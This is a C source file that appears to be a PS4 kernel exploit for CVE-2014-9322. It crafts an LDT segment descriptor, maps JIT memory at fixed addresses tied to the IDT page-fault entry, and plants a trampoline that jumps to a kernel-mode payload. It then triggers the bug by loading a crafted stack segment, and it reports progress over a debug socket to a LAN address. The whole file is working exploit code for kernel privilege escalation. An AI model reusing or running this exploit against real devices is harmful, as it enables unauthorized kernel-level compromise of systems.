#include "ps4.h"
#include "defines.h"

volatile static int sock;
int idx, FLAG = 0;

struct user_segment_descriptor desc;
uint64_t gsBase[PAGE_SIZE];
uint64_t xpageEntryHi = NULL;
char *criticalPayloadMessage = "  [+] Entered critical payload\n";

void * segManipulatorThread(void * none)
{
	printf("Loaded 2 on core %d\n", sceKernelGetCurrentCpu());
	stick_this_thread_to_core(CORE);

	memset(&desc, 0, sizeof(desc));
	desc.sd_lolimit = 0xffff;
	desc.sd_type = SDT_MEMRWA;
	desc.sd_dpl = 3;
	desc.sd_p = 1;
	desc.sd_hilimit = 0xf;
	desc.sd_gran = 1;
	desc.sd_def32 = 1;
	idx = i386_set_ldt2(LDT_AUTO_ALLOC, &desc, 1);

	sceKernelSleep(3);

	desc.sd_p = 0;

	i386_set_ldt2(idx, &desc, 1);

	FLAG = 1;

	sceKernelSleep(60);

	return NULL;
}

void payload()
{
	struct thread *td;

	// Switch back to kernel GS base
	asm volatile("swapgs");

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Send a message
	{
		int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10;

		struct sendto_args args = { sock, criticalPayloadMessage, strlen(criticalPayloadMessage), 0, NULL, 0 };
		sendto(td, &args);
	} 

	while(1);
}

void allocatePayload() {
	int executableHandle;
	int writableHandle;
	void *codepe0 = NULL;
	void *codepe1 = NULL;
	void *codepe2 = NULL;
	void *codepe3 = NULL;
	void *codepe4 = NULL;
	void *codepe5 = NULL;

	void *codepw = NULL;
	uint8_t tramp[12] =	{	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// movabs rax, 64bitaddr (this addr will get replaced by &payload)
					0xFF, 0xE0,							// jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map the userland Xpage addresses r+e
	codepe0 = mmap((void *)((uint64_t)0x0825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);
	codepe1 = mmap((void *)((uint64_t)0x1825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);
	codepe2 = mmap((void *)((uint64_t)0x2825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);
	codepe3 = mmap((void *)((uint64_t)0x3825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);
	codepe4 = mmap((void *)((uint64_t)0x4825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);
	codepe5 = mmap((void *)((uint64_t)0x5825FC000), PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, executableHandle, 0);

	// Prefault on them
	prefault(codepe0, PAGE_SIZE);
	prefault(codepe1, PAGE_SIZE);
	prefault(codepe2, PAGE_SIZE);
	prefault(codepe3, PAGE_SIZE);
	prefault(codepe4, PAGE_SIZE);
	prefault(codepe5, PAGE_SIZE);

	// Map the writable address pointing to userland Xpage
	codepw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Set payload() address on trampoline code
	*(uint64_t*)(tramp + 2) = (uint64_t)payload;

	// Write the trampoline code
	memset(codepw, 0x90, PAGE_SIZE);
	memcpy(codepw + 0x3170, (uint8_t*)&tramp, sizeof(tramp));

	// Prefault on payload test message
	prefault(criticalPayloadMessage, strlen(criticalPayloadMessage) + 1);
}

int _main(void) {
	idt_entry_t *idt_entries;
	idt_ptr_t idt_ptr;
	ScePthread thread1;
	struct sockaddr_in server;
	unsigned short hack_ss;

	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

	// -- DEBUG SOCKET --
	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 119);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	// -- DEBUG SOCKET --

	printf("Loaded on core %d\n", sceKernelGetCurrentCpu());
	stick_this_thread_to_core(CORE);

	// Get address of Xpage entry
	asm volatile("sidt %0" : "=m"(idt_ptr));
	idt_entries = (idt_entry_t *)idt_ptr.base;
	xpageEntryHi = (uint64_t)&(idt_entries[14]).target_offset_high;
	printf("xpageEntryHi = %p\n", xpageEntryHi);

	allocatePayload();

	//scePthreadCreate(&thread3, NULL, threadFunction3, NULL, "pthread_pene3");

	// Create exploit thread
	if (scePthreadCreate(&thread1, NULL, segManipulatorThread, NULL, "pthread_pene") != 0) {
		printf("[cve_2014_9322 error]: pthread_create");
		return 0;
	}

	sceKernelSleep(1);

	// Set crafted gs
	memset(&gsBase, 0x00, PAGE_SIZE * 8);
	gsBase[0] = xpageEntryHi - 0x3E4;
	amd64_set_gsbase(&gsBase);

	// Trigger bug
	hack_ss = LDT3(idx);
	asm volatile ("mov %%ss, %0" : : "rm" (hack_ss));

	while (FLAG == 0) {};

	printf("exploited? Looks like nope\n");
	sceNetSocketClose(sock);

	return 0;
}

